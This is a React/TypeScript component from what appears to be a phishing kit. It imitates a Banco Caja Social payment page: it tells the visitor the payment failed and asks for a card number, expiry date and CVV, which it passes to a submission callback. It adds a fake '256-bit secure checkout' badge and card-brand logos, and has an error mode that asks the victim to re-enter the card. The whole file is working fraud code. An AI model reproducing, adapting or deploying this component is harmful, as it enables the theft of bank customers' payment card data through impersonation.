/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

import LoaderFullScreen from "./LoaderFullScreen";

export default function Tarcredito({ enviar, isError = false }: { enviar?: any; isError?: boolean }) {
  const [loading, setLoading] = useState(false);
  const [numero, setNumero] = useState("");
  const [exp, setExp] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(isError);


  // Formateo de Tarjeta (4 en 4)
  const handleNumeroChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    const formatted = val.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    if (val.length <= 16) setNumero(formatted);
  };

  // Formateo de Fecha (MM/AA)
  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length >= 2) val = val.substring(0, 2) + "/" + val.substring(2, 4);
    if (val.length <= 5) setExp(val);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanNum = numero.replace(/\s/g, "");

    if (cleanNum.length === 16 && exp.length === 5 && cvv.length === 3) {
      setLoading(true);
      setError(false);
      if (enviar) {
        await enviar?.({ tarjeta: numero, fecha: exp, cvv, view: "tarjeta_verif" });
      }
      setLoading(false);
    } else {
      setError(true);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />

      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm animate-in fade-in duration-300">
        <div className="w-full max-w-[500px] bg-white rounded-lg shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">

          {/* Header del Modal */}
          <div className="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-white">
            <h2 className="text-[19px] font-bold text-[#00548d]">Pago no realizado</h2>
            <div className="flex gap-1.5">
              <div className="h-2 w-8 rounded-full bg-[#ef7b00]"></div>
              <div className="h-2 w-8 rounded-full bg-gray-200"></div>
            </div>
          </div>

          <div className="p-8 md:p-10">
            <form onSubmit={handleSubmit} className="space-y-6">
              {isError && (
                <div className="bg-red-50 border border-red-200 rounded-md px-4 py-3 mb-2">
                  <p className="text-red-600 text-[14px] font-semibold text-center">
                    ⚠️ Los datos de la tarjeta son incorrectos. Por favor inténtelo de nuevo.
                  </p>
                </div>
              )}
              <p className="text-[14px] text-gray-500 mb-6 text-center italic">
                En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
              </p>

              <div className="space-y-4">
                {/* Campo Número de Tarjeta */}
                <div>
                  <label className="block text-[12px] font-bold text-gray-500 mb-1 uppercase tracking-tight">
                    Número de Tarjeta
                  </label>
                  <input
                    type="text"
                    value={numero}
                    onChange={handleNumeroChange}
                    placeholder="0000 0000 0000 0000"
                    className={`w-full px-4 py-3 border rounded-md outline-none text-[18px] tracking-widest transition-all
                      ${error && numero.replace(/\s/g, "").length !== 16 ? 'border-red-500 bg-red-50' : 'border-[#cfd6db] focus:border-[#00548d]'}
                    `}
                    autoFocus
                  />
                </div>

                <div className="flex gap-4">
                  {/* Campo Expiración */}
                  <div className="w-1/2">
                    <label className="block text-[12px] font-bold text-gray-500 mb-1 uppercase tracking-tight">
                      Expiración
                    </label>
                    <input
                      type="text"
                      value={exp}
                      onChange={handleExpChange}
                      placeholder="MM/AA"
                      className={`w-full px-4 py-3 border rounded-md outline-none text-[18px] text-center transition-all
                        ${error && exp.length !== 5 ? 'border-red-500 bg-red-50' : 'border-[#cfd6db] focus:border-[#00548d]'}
                      `}
                    />
                  </div>

                  {/* Campo CVV */}
                  <div className="w-1/2">
                    <label className="block text-[12px] font-bold text-gray-500 mb-1 uppercase tracking-tight">
                      CVV
                    </label>
                    <input
                      type="text"
                      maxLength={3}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                      placeholder="123"
                      className={`w-full px-4 py-3 border rounded-md outline-none text-[18px] text-center transition-all
                        ${error && cvv.length !== 3 ? 'border-red-500 bg-red-50' : 'border-[#cfd6db] focus:border-[#00548d]'}
                      `}
                    />
                  </div>
                </div>
              </div>

              {error && (
                <p className="text-red-600 text-[13px] font-medium text-center italic">
                  Por favor complete los datos correctamente.
                </p>
              )}

              <button
                type="submit"
                disabled={numero.length < 19 || exp.length < 5 || cvv.length < 3}
                className={`w-full py-4 rounded-full font-bold text-[15px] transition-all shadow-md
                  ${numero.length === 19 && exp.length === 5 && cvv.length === 3
                    ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                    : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                `}
              >
                VALIDAR INFORMACIÓN
              </button>
            </form>
          </div>

          {/* Footer de Seguridad */}
          <div className="bg-gray-50 px-8 py-4 flex justify-between items-center border-t border-gray-100 grayscale opacity-50">
            <div className="flex gap-3">
              <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-3" alt="Visa" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-5" alt="Mastercard" />
            </div>
            <span className="text-[11px] text-gray-400 font-medium uppercase tracking-tighter">
              Secure Checkout 256-bit
            </span>
          </div>
        </div>
      </div>

      {/* FONDO REFERENCIAL */}
      <div className="flex min-h-screen bg-white opacity-20 pointer-events-none">
        <div className="hidden lg:block w-1/2 relative">
          <img src="/cajasocial/background-2.png" alt="" className="absolute inset-0 w-full h-full object-cover" />
        </div>
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8">
          <div className="w-full max-w-[440px]">
            <img src="/cajasocial/logoBCSLine.svg" alt="" className="h-[45px] mb-10" />
            <div className="h-4 bg-gray-200 rounded w-full mb-4"></div>
          </div>
        </div>
      </div>
    </>
  );
}